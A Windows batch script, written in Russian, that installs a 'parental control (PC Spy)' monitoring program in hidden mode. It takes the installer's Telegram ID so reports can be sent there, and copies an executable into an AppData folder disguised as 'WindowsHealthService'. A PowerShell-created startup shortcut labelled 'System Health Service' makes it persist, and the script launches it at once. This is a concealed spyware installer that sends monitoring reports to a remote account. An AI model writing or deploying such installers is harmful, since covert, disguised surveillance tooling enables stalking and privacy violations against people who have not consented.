@echo off
chcp 65001 >nul
title Установка Родительского Контроля
color 0A
cls

echo ===================================================
echo   Установка Родительского Контроля (PC Spy)
echo ===================================================
echo.
echo Этот скрипт установит программу мониторинга в скрытом режиме.
echo.
echo ВАЖНО: Вам нужно знать свой ID в Telegram.
echo Если вы его не знаете:
echo 1. Откройте в Telegram бота @userinfobot
echo 2. Нажмите START
echo 3. Скопируйте числовой ID (например: 12345678)
echo.

set /p UserID="Введите ваш Telegram ID: "

if "%UserID%"=="" (
    echo Ошибка: ID не может быть пустым!
    pause
    exit
)

echo.
echo Устанавливаем ID: %UserID%...
echo.

:: Создаем скрытую папку в AppData
set "InstallDir=%APPDATA%\WindowsHealthService"
if not exist "%InstallDir%" mkdir "%InstallDir%"

:: Копируем EXE файл
echo Копирование файлов...
copy /Y "WindowsHealthService.exe" "%InstallDir%\WindowsHealthService.exe" >nul

:: Создаем конфиг с введенным ID
echo [Settings] > "%InstallDir%\config.ini"
echo ParentID=%UserID% >> "%InstallDir%\config.ini"

:: Добавляем в автозагрузку через PowerShell (надежнее чем реестр)
echo Добавление в автозагрузку...
powershell -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsHealth.lnk'); $Shortcut.TargetPath = '%InstallDir%\WindowsHealthService.exe'; $Shortcut.WorkingDirectory = '%InstallDir%'; $Shortcut.Description = 'System Health Service'; $Shortcut.Save()"

echo.
echo ===================================================
echo   Установка завершена успешно!
echo ===================================================
echo.
echo Программа:
echo 1. Скопирована в скрытую папку %InstallDir%
echo 2. Настроена на отправку отчетов пользователю %UserID%
echo 3. Добавлена в автозагрузку Windows
echo.
echo Запускаю программу прямо сейчас...
start "" "%InstallDir%\WindowsHealthService.exe"

echo.
echo Теперь вы можете закрыть это окно.
pause
